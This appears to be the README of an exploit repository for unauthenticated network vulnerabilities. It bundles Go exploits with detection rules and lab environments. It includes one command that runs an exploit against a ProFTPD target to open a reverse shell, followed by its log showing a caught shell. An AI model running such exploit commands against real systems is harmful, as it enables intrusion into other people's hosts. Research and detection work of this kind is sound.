# Initial Access Community

VulnCheck's Initial Access Community contains exploits and associated artifacts from our proprietary [Initial Access Intelligence](https://docs.vulncheck.com/products/initial-access-intelligence) product and community contributions. The typical focus of Initial Access is network-based vulnerabilities that don't require user interaction, with a strong preference for unauthenticated vulnerabilities. Typical targets include routers, VPNs, self-hosted services (MobileIron, GitLab, Confluence, etc.), network appliances, B2B applications, and IoT devices.

Exploits are written in Go using VulnCheck's [go-exploit framework](https://github.com/vulncheck-oss/go-exploit). When possible, exploits include a target verifier and a version scanner. Initial Access is not just about exploits, though. We also care about discovery and detection. Alongside the exploits, we include, when possible:

* PCAPs
* Suricata rules
* Snort 2.9 rules
* YARA rules
* Nmap scripts
* Sigma rules
* Vulnerable Docker Compose environments
* Target Intelligence queries for Censys, Censys Legacy, Shodan, FOFA, ZoomEye, Google, and Baidu.

## Exploits

### Exploit Design

We follow the same guidance as `go-exploit` for exploit design. See the [`go-exploit` package overview](https://pkg.go.dev/github.com/vulncheck-oss/go-exploit#pkg-overview).

### Exploit Usage

```console
$ cd feed/cve-2026-42167
$ make
$ ./build/cve-2026-42167_linux-amd64 -a -v -c -e -c2 SimpleShellServer -rhost 127.0.0.1 -rport 2121 -lhost 172.23.0.1 -lport 4446
time=2026-05-08T19:17:44Z level=STATUS msg="Starting listener on 172.23.0.1:4446"
time=2026-05-08T19:17:44Z level=STATUS msg="Validating ProFTPD target" host=127.0.0.1 port=2121
time=2026-05-08T19:17:44Z level=SUCCESS msg="Target verification succeeded!" host=127.0.0.1 port=2121 verified=true
time=2026-05-08T19:17:44Z level=STATUS msg="Running a version check on the remote target" host=127.0.0.1 port=2121
time=2026-05-08T19:17:44Z level=STATUS msg="This exploit has not implemented a version check" host=127.0.0.1 port=2121 vulnerable=notimplemented
time=2026-05-08T19:17:44Z level=STATUS msg="Building reverse shell to 172.23.0.1:4446"
time=2026-05-08T19:17:44Z level=STATUS msg="Sending COPY-to-program injection to 127.0.0.1:2121"
time=2026-05-08T19:17:44Z level=SUCCESS msg="Caught new shell from 172.23.0.2:49722"
time=2026-05-08T19:17:44Z level=STATUS msg="Active shell from 172.23.0.2:49722"
time=2026-05-08T19:17:48Z level=SUCCESS msg="Exploit successfully completed" exploited=true
$ id
uid=999(postgres) gid=999(postgres) groups=999(postgres)
```

## Repository Layout

* `feed/` - Exploits and vulnerability-specific artifacts
* `verification/` - Shared target verification code
* `shells/` - Shared shell and payload code
* `examples/` - Templates for building new exploits
* `tools/` - Project tooling and utilities
